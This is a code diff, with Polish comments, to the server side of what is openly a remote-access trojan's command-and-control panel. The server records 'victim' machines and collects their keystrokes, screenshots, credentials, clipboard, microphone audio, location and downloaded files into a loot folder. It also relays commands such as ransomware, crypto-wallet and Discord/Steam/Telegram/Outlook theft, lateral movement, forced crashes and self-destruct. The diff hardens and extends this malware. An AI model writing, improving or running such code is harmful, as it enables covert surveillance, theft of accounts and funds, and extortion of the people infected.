@@ -20,20 +20,19 @@ let keylogs = {};
 let screenshots = {};
 let credentials = {};
 let processes = {};
-let geoData = {};
 let clipboardLog = {};
-let notifications = {};
 
 app.get('/api/clients', (req, res) => {
-    res.json(Object.values(clients).map(c => ({
+    const list = Object.values(clients).filter(c => c.type === 'victim').map(c => ({
         id: c.id, ip: c.ip, hostname: c.hostname, user: c.user, os: c.os,
         online: c.online, cpu: c.cpu, gpu: c.gpu, ram: c.ram, resolution: c.resolution,
         country: c.country, lat: c.lat, lon: c.lon, uptime: c.uptime, lastSeen: c.lastSeen
-    })));
+    }));
+    res.json(list);
 });
 
 app.get('/api/stats', (req, res) => {
-    const all = Object.values(clients);
+    const all = Object.values(clients).filter(c => c.type === 'victim');
     const online = all.filter(c => c.online).length;
     const total = all.length;
     const today = all.filter(c => c.lastSeen && new Date(c.lastSeen).toDateString() === new Date().toDateString()).length;
@@ -77,7 +76,6 @@ app.get('/api/processes/:clientId', (req, res) => {
     res.json(processes[req.params.clientId] || []);
 });
 
-// Wszystkie endpointy akcji
 const actions = ['files','download_file','upload_file','process_kill','process_start','power','bsod',
     'ransomware','steal_crypto','steal_discord','steal_steam','steal_telegram','steal_outlook',
     'proxy_start','proxy_stop','scan_network','lateral_move','cleanse','update','selfdestruct',
@@ -89,36 +87,47 @@ const actions = ['files','download_file','upload_file','process_kill','process_s
 
 actions.forEach(a => {
     app.get(`/api/${a}`, (req, res) => {
-        const data = {};
-        for (let k in req.query) data[k] = req.query[k];
-        io.to(req.query.clientId).emit(a, data);
+        io.to(req.query.clientId).emit(a, req.query);
         res.send('OK');
     });
 });
 
 io.on('connection', (socket) => {
+    const clientType = socket.handshake.query.type || 'victim';
     const clientId = socket.handshake.query.id || socket.id;
     const ip = socket.handshake.address;
     
-    clients[clientId] = { id: clientId, ip: ip, socketId: socket.id, online: true, hostname: '', user: '', os: '', cpu: '', gpu: '', ram: '', resolution: '', country: '', lat: 0, lon: 0, uptime: '', lastSeen: new Date().toISOString() };
-    responses[clientId] = responses[clientId] || [];
-    keylogs[clientId] = keylogs[clientId] || [];
-    screenshots[clientId] = screenshots[clientId] || [];
-    clipboardLog[clientId] = clipboardLog[clientId] || [];
-    notifications[clientId] = notifications[clientId] || [];
+    // TYLKO jeśli to victim, dodaj do listy
+    if (clientType === 'victim') {
+        clients[clientId] = {
+            id: clientId, ip: ip, socketId: socket.id, online: true, type: 'victim',
+            hostname: '', user: '', os: '', cpu: '', gpu: '', ram: '',
+            resolution: '', country: '', lat: 0, lon: 0, uptime: '', lastSeen: new Date().toISOString()
+        };
+        responses[clientId] = responses[clientId] || [];
+        keylogs[clientId] = keylogs[clientId] || [];
+        screenshots[clientId] = screenshots[clientId] || [];
+        clipboardLog[clientId] = clipboardLog[clientId] || [];
+    }
     
     socket.on('register', (data) => {
-        Object.assign(clients[clientId], data, { online: true, lastSeen: new Date().toISOString() });
+        if (clientType === 'victim' && clients[clientId]) {
+            Object.assign(clients[clientId], data, { online: true, lastSeen: new Date().toISOString() });
+        }
     });
 
     socket.on('response', (data) => {
-        responses[clientId].push(`[${new Date().toLocaleTimeString()}] ${data}`);
-        if (responses[clientId].length > 200) responses[clientId].shift();
+        if (responses[clientId]) {
+            responses[clientId].push(`[${new Date().toLocaleTimeString()}] ${data}`);
+            if (responses[clientId].length > 200) responses[clientId].shift();
+        }
     });
 
     socket.on('keylog', (data) => {
-        keylogs[clientId].push(data);
-        if (keylogs[clientId].length > 500) keylogs[clientId].shift();
+        if (keylogs[clientId]) {
+            keylogs[clientId].push(data);
+            if (keylogs[clientId].length > 500) keylogs[clientId].shift();
+        }
     });
 
     socket.on('screenshot', (data) => {
@@ -126,7 +135,7 @@ io.on('connection', (socket) => {
         if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
         const fn = `screen_${Date.now()}.jpg`;
         fs.writeFileSync(`${dir}/${fn}`, Buffer.from(data, 'base64'));
-        screenshots[clientId] = screenshots[clientId] || [];
+        if (!screenshots[clientId]) screenshots[clientId] = [];
         screenshots[clientId].push({ filename: fn, time: new Date().toISOString() });
         if (screenshots[clientId].length > 100) screenshots[clientId].shift();
     });
@@ -143,13 +152,17 @@ io.on('connection', (socket) => {
 
     socket.on('credentials', (data) => { credentials[clientId] = data; });
     socket.on('processes', (data) => { processes[clientId] = data; });
-    socket.on('clipboard_data', (data) => { clipboardLog[clientId].push(data); if (clipboardLog[clientId].length > 200) clipboardLog[clientId].shift(); });
+    socket.on('clipboard_data', (data) => {
+        if (clipboardLog[clientId]) {
+            clipboardLog[clientId].push(data);
+            if (clipboardLog[clientId].length > 200) clipboardLog[clientId].shift();
+        }
+    });
     
     socket.on('file_data', (data) => {
         const dir = `${LOOT}/${clientId}/downloads`;
         if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
         fs.writeFileSync(`${dir}/${data.name}`, Buffer.from(data.data, 'base64'));
-        responses[clientId].push(`[PLIK] ${data.name}`);
     });
 
     socket.on('mic_data', (data) => {
@@ -163,13 +176,18 @@ io.on('connection', (socket) => {
     });
 
     socket.on('geolocate', (data) => {
-        clients[clientId].country = data.country;
-        clients[clientId].lat = data.lat;
-        clients[clientId].lon = data.lon;
+        if (clients[clientId]) {
+            clients[clientId].country = data.country;
+            clients[clientId].lat = data.lat;
+            clients[clientId].lon = data.lon;
+        }
     });
 
     socket.on('disconnect', () => {
-        if (clients[clientId]) { clients[clientId].online = false; clients[clientId].lastSeen = new Date().toISOString(); }
+        if (clients[clientId]) {
+            clients[clientId].online = false;
+            clients[clientId].lastSeen = new Date().toISOString();
+        }
     });
 });
 
